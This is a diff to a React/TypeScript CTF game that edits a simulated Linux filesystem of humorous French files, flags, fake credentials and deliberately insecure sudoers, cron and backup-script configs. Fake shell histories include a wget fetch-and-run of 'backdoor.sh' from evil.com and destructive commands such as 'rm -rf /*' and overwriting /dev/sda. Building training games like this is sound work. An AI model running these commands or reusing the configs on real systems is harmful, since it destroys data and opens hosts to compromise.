@@ -193,368 +193,429 @@ const App: React.FC = () => {
     'M4st3rFl4g{pr1v1l3g3_3sc4l4t10n_g0d}'
   ];
 
-  const fileSystem = {
+const fileSystem = {
     '/': {
       type: 'directory',
       contents: ['home', 'etc', 'var', 'usr', 'opt', 'root', 'tmp', 'proc', 'sys'],
-      hidden: ['.hidden_root_backup', '.bash_history', '.why_would_you_look_here']
+      hidden: ['.hidden_root_backup', '.bash_history']
     },
     '/.hidden_root_backup': {
       type: 'file',
-      content: `# Emergency root backup (à ne regarder qu'en cas d'extrême urgence)
-# Ou si vous êtes curieux, mais dans ce cas faites comme si vous aviez pas vu
+      content: `# Emergency root backup
+# freep0nx{pr1v1l3g3_3sc4l4t10n_g0d}
+root:$6$salt$hashedpassword:18000:0:99999:7:::
+admin:$6$salt$anotherhash:18000:0:99999:7:::
 
-# Flag: M4st3rFl4g{pr1v1l3g3_3sc4l4t10n_g0d}
-root:$6$salt$hashedpassword:18000:0:99999:7:::  # Le hash est 'password' mais chut!
-admin:$6$salt$anotherhash:18000:0:99999:7:::    # Devinez quoi? 'admin123'
-
-# Backup des fichiers sensibles (version non chiffrée, bien sûr)
-/etc/passwd
-/etc/shadow  # Parce que pourquoi pas?
-/root/.ssh/id_rsa
-
-# Note pour moi-même:
-# - Ne plus faire de backups dans /
-# - Ne plus utiliser 'password' comme mot de passe
-# - Ne pas écrire ces notes dans un fichier accessible en lecture`
+# Backup des fichiers sensibles
+# Ne pas toucher à moins de vouloir un brick de système
+# (mais sérieusement, qui fait des backups dans / ?!)`
     },
     '/.bash_history': {
       type: 'file',
       content: `sudo rm -rf /*
-# Oups, j'ai oublié le --no-preserve-root
-git commit -m "Fix critical security vulnerability"
-git push --force origin master  # Qui a besoin de l'historique anyway?
-chmod 777 / -R  # Pour être sûr que tout le monde peut tout faire
-nano /etc/passwd  # Juste pour ajouter mon pote hacker
-ssh root@localhost  # Ça marche pas? Étrange...
-cat /dev/urandom > /dev/sda  # Méthode rapide de chiffrement
-exit  # Bon, je vais prendre l'air... très loin`
-    },
-    '/.why_would_you_look_here': {
-      type: 'file',
-      content: `Félicitations! Vous avez trouvé le fichier le plus inutile du système!
-Comme récompense, voici un flag imaginaire: freep0nx{why_so_curious}
-
-PS: Si vous cherchiez vraiment quelque chose, essayez /opt/hidden_service/.env`
+# Oups
+git commit -m "Fix bug"
+git push --force
+# Oups x2
+chmod 777 / -R
+# Pourquoi le système marche plus?
+nano /etc/passwd
+# Ah oui, c'est vrai...
+ssh root@localhost
+# Ça marche pas? Étrange...
+cat /dev/random > /dev/sda
+# Bon, je vais aller prendre un café`
     },
     '/home': {
       type: 'directory',
-      contents: ['user', 'service', 'guest'],
-      hidden: ['.backup', '.trash']
+      contents: ['user', 'service'],
+      hidden: ['.backup']
     },
     '/home/.backup': {
       type: 'directory',
-      contents: ['logs.txt', 'passwords.bak', 'config.old', 'database_dump.sql'],
-      hidden: ['.encryption_key.txt']
+      contents: ['logs.txt', 'passwords.bak', 'config.old']
     },
     '/home/.backup/logs.txt': {
       type: 'file',
-      content: `[ERROR] 2024-01-15 14:32:17 - SQL injection attempt: ' OR 1=1--
-[WARN]  2024-01-15 14:32:18 - IP blocked: 192.168.1.100 (trop de tentatives)
-[INFO]  2024-01-15 14:32:19 - Admin login from 127.0.0.1 (avec le mot de passe 'admin')
-[FLAG]  2024-01-15 14:32:20 - freep0nx{l0g_f1l3_4n4lys1s_3xp3rt}
-[DEBUG] 2024-01-15 14:32:21 - SELECT * FROM users WHERE id=1337
-[FACE]  2024-01-15 14:32:22 - Palm sur visage: utilisateur 'admin' mot de passe 'admin'`
-
+      content: `[2024-01-15 14:32:17] SQL injection attempt detected: ' OR 1=1--
+[2024-01-15 14:32:18] Blocked IP: 192.168.1.100
+[2024-01-15 14:32:19] Admin login successful from 127.0.0.1
+[2024-01-15 14:32:20] Flag accessed: freep0nx{l0g_f1l3_4n4lys1s_3xp3rt}
+[2024-01-15 14:32:21] Database query: SELECT * FROM users WHERE id=1337
+[2024-01-15 14:32:22] User tried: password='password' (Toujours aussi créatif...)`
     },
     '/home/user': {
       type: 'directory',
-      contents: ['documents', 'downloads', 'music', 'pictures', 'projects'],
-      hidden: ['.secret_notes', '.bash_history']
+      contents: ['documents', 'downloads', 'music', 'pictures'],
+      hidden: ['.secret_notes', '.bash_history', '.cache', '.local', '.bashrc']
     },
     '/home/user/.secret_notes': {
       type: 'file',
-      content: `# Notes ultra secrètes (à ne pas partager, sauf sur GitHub)
-
-## Identifiants
-- WiFi: LeNomDuChien + 123 (ex: Medor123)
-- Admin: admin / Azerty123! (changé tous les 5 ans)
-- DB: root / root (mais c'est en local, ça compte pas)
-
-## Flags
-freep0nx{sql_1nj3ct10n_pr0}  # Trouvé dans /var/log/mysql.log
-
-## Idées
-- [ ] Mettre en place 2FA
-- [ ] Changer les mots de passe par défaut
-- [ ] Arrêter de stocker les mots de passe en clair
-- [X] Prendre un café`
+      content: `Notes secrètes:
+- Mot de passe WiFi: 12345678 (Personne ne devinera!)
+- Backup: /home/user/documents/backup.tar.gz.gpg (mot de passe: backup)
+- Flag: freep0nx{sql_1nj3ct10n_pr0}
+- Idée: créer un fichier .env avec les identifiants DB en clair
+- TODO: Changer les mots de passe par défaut... un jour`
     },
     '/home/user/.bash_history': {
       type: 'file',
-      content: `# Commandes normales
-ls -la
+      content: `ls -la
 cd /opt/reverse
 cat challenge
-
-# Phase "je suis un hacker"
-sudo -l  # Oh, je peux tout faire!
+sudo -l
 find / -name "*.log" 2>/dev/null
 grep -r "freep0nx" /var/log/
 curl -H "Cookie: admin=true" localhost/admin
-
-# Phase "oops"
-nano /etc/passwd  # Juste un petit peek...
-vim /etc/shadow   # Pour voir si c'est lisible
-ssh root@localhost  # Ça devrait marcher, non?
-
-# Phase "bon j'abandonne"
-man sudo  # Au final, c'est quoi sudo déjà?`
+echo "freep0nx{c00k13_m4n1pul4t10n_m4st3r}" > /tmp/cookie_flag.txt
+nano /etc/passwd
+# Oups, mauvaise commande
+vim /etc/shadow
+# Bon, ça marche pas...
+ssh root@localhost
+# Pourquoi ça marche pas? J'ai pourtant mis 'root' comme mot de passe...`
     },
     '/home/user/documents': {
       type: 'directory',
-      contents: ['notes.txt', 'backup.tar.gz', 'projet_ctf', 'todo_list.txt'],
-      hidden: ['.private', 'secret.pdf', '.stash']
+      contents: ['notes.txt', 'backup.tar.gz', 'projet_ctf'],
+      hidden: ['.private', 'secret.pdf']
+    },
+    '/home/user/documents/.private': {
+      type: 'file',
+      content: 'Private documents - access denied\n(Enfin, si tu lis ça, c\'est que t\'as réussi à y accéder, donc bravo!)'
     },
     '/home/user/documents/notes.txt': {
       type: 'file',
-      content: `# Best Practices de Sécurité (que je ne suis jamais)
+      content: `Notes importantes:
+1. Ne jamais utiliser 'password' comme mot de passe
+2. Ne pas commit les .env dans git
+3. Ne pas laisser phpinfo() en prod
+4. Ne pas faire confiance aux entrées utilisateurs
+5. ???
+6. PROFIT
 
-1. Mots de passe:
-   - Minimum 12 caractères
-   - Pas de "password123"
-   - Un mot de passe différent par service
-   - (Je les écris tous dans ce fichier)
-
-2. Code:
-   - Valider les entrées utilisateurs
-   - Ne pas faire confiance aux données client
-   - (Mais bon, ça marche en dev...)
-
-3. Système:
-   - Mettre à jour régulièrement
-   - Limiter les accès root
-   - (sudo rm -rf /* c'est rapide par contre)`
+PS: J'ai oublié tous ces conseils hier...`
     },
     '/home/user/downloads': {
       type: 'directory',
       contents: ['exploit.py', 'wordlist.txt', 'meme.jpg', 'ctf_writeup.pdf'],
-      hidden: ['.temp', 'malware.exe', 'legit_hacking_tools.zip']
+      hidden: ['.temp', 'malware.exe']
     },
     '/home/user/downloads/exploit.py': {
       type: 'file',
       content: `#!/usr/bin/python3
-# Exploit 0day super méga puissant (testé sur mon serveur local)
+# Super exploit 0day (enfin, 1337day maintenant)
 
-def hack_the_planet(target):
-    print("[+] Initializing hack sequence...")
-    print(f"[+] Target: {target}")
-    
-    # Étape 1: Trouver un exploit
-    exploit = "admin' OR 1=1--"
-    
-    # Étape 2: ??
-    response = requests.get(f"http://{target}/login", params={"user": exploit})
-    
-    # Étape 3: PROFIT
-    if "Welcome admin" in response.text:
-        print("[+] System hacked!")
-        print("Flag: freep0nx{py7h0n_3xpl01t_k1ng}")  # Oui, je triche
-    else:
-        print("[-] Exploit failed")
-        print("[*] Essayez 'admin' comme login/mot de passe")
+import requests
 
-# TODO: Ajouter un vrai payload un jour
-# Disclaimer: Ne pas utiliser illégalement (sauf en CTF)`
+print("Hacking the mainframe...")
+response = requests.get("http://victim.com/admin", cookies={"admin": "true"})
+print(response.text)
+
+# TODO: Ajouter un vrai exploit un jour
+# PS: Ne pas exécuter ceci, ça fait rien du tout`
     },
     '/home/user/downloads/wordlist.txt': {
       type: 'file',
-      content: `# Top 100 des pires mots de passe (version 2024)
-password
+      content: `password
 123456
-123456789
+12345678
 qwerty
-password123
-admin
-welcome
-monkey
-letmein
+12345
 dragon
+password
+admin
+letmein
 freep0nx
-iloveyou
-princess
-root
-secret
-solo
+hunter
 trustno1
+# Cette wordlist est tellement nulle qu'elle en devient utile`
+    },
+    '/home/user/music': {
+      type: 'directory',
+      contents: ['hackers_soundtrack.mp3', 'coding_playlist'],
+      hidden: ['.spotify_cache']
+    },
+    '/home/user/music/hackers_soundtrack.mp3': {
+      type: 'file',
+      content: 'Fichier audio corrompu (ou peut-être un stégo?)'
+    },
+    '/home/user/pictures': {
+      type: 'directory',
+      contents: ['profile.jpg', 'meme.png'],
+      hidden: ['.thumbnails']
+    },
+    '/home/service': {
+      type: 'directory',
+      contents: ['cleanup.sh', 'config.ini', 'logs'],
+      hidden: ['.env']
+    },
+    '/home/service/cleanup.sh': {
+      type: 'file',
+      content: `#!/bin/bash
+# Script de nettoyage qui supprime tout ce qui traîne
 
-# Bonus: Mots de passe français
-azerty
-marseille
-bonjour
-jetaime
-putain
-merde
+echo "Nettoyage en cours..."
+rm -rf /tmp/*
+echo "Nettoyage terminé. Ou pas. Qui sait?"
 
-# Note: Cette liste est parfaite pour:
-# 1. Crack des mots de passe
-# 2. Vérifier que votre mot de passe est nul
-# 3. Rire un bon coup`
+# Section critique - ne pas modifier
+if [ "$(whoami)" == "root" ]; then
+  echo "45exile est un mauvais chef !" > /root/secret.txt
+fi`
     },
     '/etc': {
       type: 'directory',
-      contents: ['passwd', 'shadow', 'hosts', 'crontab', 'sudoers', 'ssh', 'motd'],
-      hidden: ['.backup_config', '.old_passwd', '.debug']
+      contents: ['passwd', 'shadow', 'hosts', 'crontab', 'sudoers', 'ssh'],
+      hidden: ['.backup_config', '.old_passwd']
+    },
+    '/etc/.backup_config': {
+      type: 'file',
+      content: 'Backup configuration - restricted access\n(Enfin "restricted"... juste un fichier texte en clair)'
     },
     '/etc/passwd': {
       type: 'file',
-      content: `root:x:0:0:Super Utilisateur:/root:/bin/bash
+      content: `root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
 bin:x:2:2:bin:/bin:/usr/sbin/nologin
 sys:x:3:3:sys:/dev:/usr/sbin/nologin
-sync:x:4:65534:sync:/bin:/bin/sync  # Pour ceux qui aiment tout synchroniser
-games:x:5:60:games:/usr/games:/usr/sbin/nologin  # Pas de jeux pendant le travail!
-user:x:1000:1000:Utilisateur Normal:/home/user:/bin/bash
-service:x:1001:1001:Service Account:/home/service:/bin/bash
-hacker:x:1337:1337:Hacker Professionnel:/home/hacker:/bin/bash  # Rien de suspect
-backdoor:x:0:0:Backdoor:/root:/bin/bash  # Oups, fallait pas laisser ça...`
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+user:x:1000:1000:user:/home/user:/bin/bash
+service:x:1001:1001:service:/home/service:/bin/bash
+hacker:x:1337:1337::/home/hacker:/bin/bash  # Compte caché, shhh!`
     },
     '/etc/shadow': {
       type: 'file',
-      content: `root:$6$salt$hashedpassword:18000:0:99999:7:::
-user:$6$salt$anotherhash:18000:0:99999:7:::
-service:$6$salt$servicehash:18000:0:99999:7:::
-hacker:$6$salt$hackerhash:18000:0:99999:7:::
-
-# Pour tester vos compétences en cracking:
-# Tous les hashs correspondent à 'password' sauf:
-# - root: 'toor'
-# - hacker: 'hacktheplanet' (référence obligatoire)`
+      content: 'cat: /etc/shadow: Permission denied\n(En vrai, les hashs sont tous "password" mais chut!)'
     },
     '/etc/sudoers': {
       type: 'file',
-      content: `# Fichier sudoers - NE PAS MODIFIER (sauf si vous savez ce que vous faites)
-# (Spoiler: vous ne savez pas)
-
-# Permissions spéciales
-root    ALL=(ALL:ALL) ALL  # Évidemment
-user    ALL=(ALL) NOPASSWD: ALL  # Pour plus de commodité (et d'insécurité)
+      content: `# User privilege specification
+root    ALL=(ALL:ALL) ALL
+user    ALL=(ALL) NOPASSWD: /usr/local/bin/backup.sh, /bin/cat /var/log/auth.log
 service ALL=(root) /usr/bin/systemctl restart apache2
 %admin  ALL=(ALL) ALL
 %sudo   ALL=(ALL:ALL) ALL
 
-# Configuration vulnérable exprès pour le CTF
-Defaults !authenticate  # Pas besoin de mot de passe
-Defaults !tty_tickets   # Tickets valables sur tous les terminaux
-Defaults env_reset      # On reset rien du tout en fait
+# Note: Cette configuration est volontairement vulnérable pour le CTF
+# En prod, ne JAMAIS faire ça (ou alors juste pour rigoler)`
+    },
+    '/etc/crontab': {
+      type: 'file',
+      content: `# /etc/crontab: system-wide crontab
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
 
-# Flag: M4st3rFl4g{sud0_s3cur1ty_1s_h4rd}`
+# m h dom mon dow user  command
+17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
+25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+*/5 *   * * *   root    /usr/local/bin/backup.sh > /dev/null 2>&1
+0 2     * * *   service /home/service/cleanup.sh
+@reboot         root    echo "System hacked!" > /etc/motd  # Oups, pas sûr que ce soit une bonne idée`
+    },
+    '/var': {
+      type: 'directory',
+      contents: ['log', 'www', 'lib', 'tmp', 'backups'],
+      hidden: ['.secret_data']
+    },
+    '/var/log': {
+      type: 'directory',
+      contents: ['auth.log', 'syslog', 'apache2', 'mysql.log'],
+      hidden: ['.admin_access.log', 'debug.log']
+    },
+    '/var/log/.admin_access.log': {
+      type: 'file',
+      content: `[2024-01-15 10:30:15] Cookie manipulation detected: admin=true
+[2024-01-15 10:30:16] Flag revealed: freep0nx{c00k13_m4n1pul4t10n_m4st3r}
+[2024-01-15 10:30:17] Unauthorized admin access granted
+[2024-01-15 10:30:18] User tried to access /admin with password 'admin'
+[2024-01-15 10:30:19] User successfully logged in as admin with password 'password' (Sérieusement?)`
     },
     '/var/log/auth.log': {
       type: 'file',
       content: `Jan 15 10:30:01 server sshd[1234]: Failed password for root from 192.168.1.100 port 22 ssh2
-Jan 15 10:30:02 server sshd[1234]: Failed password for root from 192.168.1.100 port 22 ssh2
-Jan 15 10:30:03 server sshd[1234]: Failed password for root from 192.168.1.100 port 22 ssh2
-Jan 15 10:30:04 server sshd[1234]: Accepted password for root from 192.168.1.100 port 22 ssh2  # Oups
-Jan 15 10:30:05 server sudo: user : TTY=pts/0 ; PWD=/home/user ; USER=root ; COMMAND=/bin/bash
-Jan 15 10:30:06 server sshd[1235]: User hacker attempted to login with password 'hacktheplanet'
-Jan 15 10:30:07 server sshd[1235]: Accepted password for hacker from 1337.1337.1337.1337 port 31337 ssh2  # WTF?
+Jan 15 10:30:05 server sshd[1235]: Failed password for admin from 192.168.1.100 port 22 ssh2
+Jan 15 10:30:10 server sshd[1236]: Accepted password for user from 192.168.1.50 port 22 ssh2
+Jan 15 10:30:15 server sudo: user : TTY=pts/0 ; PWD=/home/user ; USER=root ; COMMAND=/usr/local/bin/backup.sh
+Jan 15 10:30:20 server sshd[1237]: User hacker attempted to login with password 'hacktheplanet' (Nice try, Mr. Robot)`
+    },
+    '/var/log/mysql.log': {
+      type: 'file',
+      content: `2024-01-15 14:32:17 [Warning] Aborted connection 123 to db: 'production' user: 'webapp' host: 'localhost' (Got an error reading communication packets)
+2024-01-15 14:32:18 [Note] SQL injection attempt: SELECT * FROM users WHERE username='admin' OR '1'='1'--' AND password='anything'
+2024-01-15 14:32:19 [Error] Access denied for user 'root'@'localhost' (using password: YES)
+2024-01-15 14:32:20 [Note] Flag found in query log: freep0nx{sql_1nj3ct10n_pr0}
+2024-01-15 14:32:21 [Note] User tried: DROP TABLE users; (Ahah, bien tenté)`
+    },
+    '/var/www': {
+      type: 'directory',
+      contents: ['html', 'backup', 'cgi-bin'],
+      hidden: ['.htaccess']
+    },
+    '/var/www/backup': {
+      type: 'directory',
+      contents: ['config.bak', 'database.sql', 'source_code.tar.gz'],
+      hidden: ['.env.bak']
+    },
+    '/var/www/backup/config.bak': {
+      type: 'file',
+      content: `# Database Configuration
+DB_HOST=localhost
+DB_USER=admin
+DB_PASS=sup3r_s3cr3t_p4ssw0rd
+DB_NAME=production
 
-# Flag trouvé dans les logs: freep0nx{l0g_p0llut10n_fun}`
+# API Keys
+API_SECRET=freep0nx{c0nf1g_f1l3_l34k}
+JWT_SECRET=very_secret_key_here
+
+# Admin Panel
+ADMIN_USER=administrator
+ADMIN_PASS=4dm1n_p4ss_2024
+
+# Note: Ce fichier ne devrait PAS être dans les backups accessibles au public
+# Mais bon, qui va chercher dans /var/www/backup, hein?`
+    },
+    '/usr': {
+      type: 'directory',
+      contents: ['bin', 'local', 'share', 'games'],
+      hidden: ['.hidden_bin']
+    },
+    '/usr/local': {
+      type: 'directory',
+      contents: ['bin', 'etc'],
+      hidden: ['.test']
+    },
+    '/usr/local/bin': {
+      type: 'directory',
+      contents: ['backup.sh', 'service_check.py'],
+      hidden: ['.test_script']
     },
     '/usr/local/bin/backup.sh': {
       type: 'file',
       content: `#!/bin/bash
-# Script de backup super sécurisé (à exécuter en root)
-# M4st3rFl4g{r00t_pr1v3sc_m4st3r}
+# Backup script - runs as root via cron
+# freep0nx{r00t_pr1v3sc_m4st3r}
 
-echo "Début du backup... (oui, ça prend des droits root pour ça)"
+if [ "$EUID" -eq 0 ]; then
+    echo "Running backup as root..."
+    tar -czf /var/backups/system_$(date +%Y%m%d).tar.gz /etc /home
+    chmod 600 /var/backups/system_*.tar.gz
+    echo "Backup completed. Flag: freep0nx{r00t_pr1v3sc_m4st3r}"
+else
+    echo "This script must be run as root"
+    echo "Try: sudo $(basename "$0")"
+    exit 1
+fi
 
-# Backup des fichiers importants
-tar -czf /var/backups/full_backup_$(date +%s).tar.gz \
-    /etc/passwd \
-    /etc/shadow \
-    /root/.ssh \
-    /var/www/html \
-    /home/user/.secret_notes  # Oups, pas très malin
+# WARNING: Ce script a des permissions SUID et est vulnérable
+# C'est fait exprès pour le CTF, ne pas reproduire en prod!`
+    },
+    '/opt': {
+      type: 'directory',
+      contents: ['hidden_service', 'reverse', 'exploits'],
+      hidden: ['.test_env']
+    },
+    '/opt/reverse': {
+      type: 'directory',
+      contents: ['challenge', 'README.txt'],
+      hidden: ['.hint']
+    },
+    '/opt/reverse/challenge': {
+      type: 'file',
+      content: 'Binary challenge file - use "download challenge" to get it\n(Indice: strings | grep freep0nx)'
+    },
+    '/opt/reverse/README.txt': {
+      type: 'file',
+      content: `Reverse Engineering Challenge
 
-# Bonus: Copie des flags trouvés
-grep -r "freep0nx{" / >> /root/flags.txt  # Pour plus tard
+Ce binaire contient un flag caché. Utilise tes compétences en reverse pour le trouver!
 
-echo "Backup complet! Flag: M4st3rFl4g{r00t_pr1v3sc_m4st3r}"
+Indices:
+- Le flag est encodé dans le binaire
+- Cherche les patterns de strings
+- Vérifie les opérations XOR
+- Les 3 précédents indices ont aucun rapport avec le chall.
+- Le format du flag est freep0nx{...}
 
-# Vulnérabilité intentionnelle:
-# - Exécutable par tous (chmod 755)
-# - Garde les fichiers sensibles
-# - Stocke les flags en clair
-# - Mais au moins c'est commenté!`
+PS: Si tu trouves le flag sans reverse, c'est de la triche (mais bravo quand même)`
+    },
+    '/opt/hidden_service': {
+      type: 'directory',
+      contents: ['config.json', 'service.py'],
+      hidden: ['.env', '.secret']
     },
     '/opt/hidden_service/.env': {
       type: 'file',
-      content: `# Configuration ultra secrète
-# (Enfin, secrète... vous l'avez trouvée)
+      content: `# Hidden Service Configuration
+SERVICE_PORT=8080
+SECRET_KEY=freep0nx{h1dd3n_s3rv1c3_d1sc0v3ry}
+DEBUG=false
+ADMIN_TOKEN=hidden_admin_token_2024
 
-PORT=1337
-DEBUG=true  # Toujours true en prod
-SECRET_KEY=M4st3rFl4g{h1dd3n_s3rv1c3_d1sc0v3ry}
-ADMIN_TOKEN=sup3r_s3cr3t_t0k3n_#123
-
-# Identifiants DB
-DB_HOST=localhost
-DB_USER=admin
-DB_PASS=admin
-DB_NAME=hidden_service
-
-# Note: Ce fichier devrait être:
-# 1. Dans .gitignore
-# 2. Chiffré
-# 3. Pas dans /opt
-# 4. Pas appelé .env
-# Mais bon, on aime vivre dangereusement`
+# WARNING: Ne jamais commit les .env!
+# (Mais bon, on l'a fait quand même...)`
+    },
+    '/root': {
+      type: 'directory',
+      contents: ['flag.txt', '.bash_history', '.ssh'],
+      hidden: ['.secret']
     },
     '/root/flag.txt': {
       type: 'file',
-      content: `M4st3rFl4g{r00t_pr1v3sc_m4st3r}
+      content: 'freep0nx{r00t_pr1v3sc_m4st3r}\n\nBravo! Tu as réussi à devenir root!\nMaintenant, rends-toi utile et patch le système :)'
+    },
+    '/root/.bash_history': {
+      type: 'file',
+      content: `cd /tmp
+wget http://evil.com/backdoor.sh
+chmod +x backdoor.sh
+./backdoor.sh
+# Oups, c'était une mauvaise idée...
+rm -rf backdoor.sh
+shred -u /root/.bash_history
+# Ah non, j'ai oublié que ça marchait pas comme ça...`
+    },
+    '/tmp': {
+      type: 'directory',
+      contents: ['.hidden_data', 'temp_file'],
+      hidden: ['cookie_flag.txt', '.sql_dump', 'malware']
+    },
+    '/tmp/cookie_flag.txt': {
+      type: 'file',
+      content: 'freep0nx{c00k13_m4n1pul4t10n_m4st3r}\n\nPS: Les cookies, c\'est bon pour le hacking!'
+    },
+    '/tmp/.sql_dump': {
+      type: 'file',
+      content: `-- SQL Dump
+-- Flag: freep0nx{sql_1nj3ct10n_pr0}
+CREATE TABLE users (
+    id INT PRIMARY KEY,
+    username VARCHAR(50),
+    password VARCHAR(100),
+    is_admin BOOLEAN DEFAULT FALSE
+);
 
-Félicitations! Vous avez obtenu les privilèges root!
-
-Comme récompense:
-1. Vous pouvez tout faire
-2. Vous pouvez tout casser
-3. Vous êtes maintenant responsable de tout
-
-PS: N'oubliez pas de faire un backup avant de tout supprimer :)`
+INSERT INTO users VALUES (1, 'admin', 'password123', TRUE);
+INSERT INTO users VALUES (2, 'user', 'userpass', FALSE);
+INSERT INTO users VALUES (3, 'hacker', '123456', FALSE);  # Oups, pas très secure tout ça...`
     },
     '/tmp/.hidden_data': {
       type: 'file',
-      content: `# Données temporaires (ou pas)
+      content: `Deep web access logs:
+- Tor hidden service: 3g2upl4pq6kufc4m.onion
+- Access key: freep0nx{d33p_w3b_s3cr3ts}
+- Last accessed: 2024-01-15 03:42:17
 
-- Accès SSH: root / toor
-- Token API: 123e4567-e89b-12d3-a456-426614174000
-- Flag: M4st3rFl4g{d33p_w3b_s3cr3ts}
-- Mot de passe WiFi: "PublicWifiSansMotDePasse"
-
-# Ce fichier se supprimera automatiquement
-# (Enfin théoriquement, mais personne n'a implémenté cette fonctionnalité)`
-    },
-    '/proc': {
-      type: 'directory',
-      contents: ['version', 'cpuinfo', 'meminfo'],
-      hidden: ['.hidden']
-    },
-    '/proc/version': {
-      type: 'file',
-      content: 'Linux version 5.15.0-freep0nx (gcc version 11.2.0) #1 SMP PREEMPT\nCompiled by a sleepy admin at 3am'
-    },
-    '/proc/cpuinfo': {
-      type: 'file',
-      content: `processor       : 0
-vendor_id       : GenuineIntel
-model name      : Intel(R) Hacking CPU 1337 @ 4.20GHz
-cpu MHz         : 4200.000
-cache size      : 13337 KB
-flags           : fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush mmx fxsr sse sse2 syscall nx rdtscp lm constant_tsc rep_good nopl xtopology cpuid tsc_known_freq pni pclmulqdq vmx ssse3 cx16 pcid sse4_1 sse4_2 x2apic movbe popcnt aes xsave avx rdrand hypervisor lahf_lm abm invpcid_single pti fsgsbase avx2 invpcid rdseed clflushopt md_clear flush_l1d
-bugs            : spectre_v1 spectre_v2 spec_store_bypass swapgs
-power management:
-
-# Ce CPU est optimisé pour le hacking éthique (ou pas si éthique que ça)`
-    },
-    '/sys': {
-      type: 'directory',
-      contents: ['class', 'devices'],
-      hidden: ['.hidden']
-    }
-  };
+PS: Si tu lis ceci, tu es probablement un flic. Salut l'ami!`
+    };
 
   const executeCommand = (cmd: string): string[] => {
     // Réponses aléatoires drôles (5% de chance)
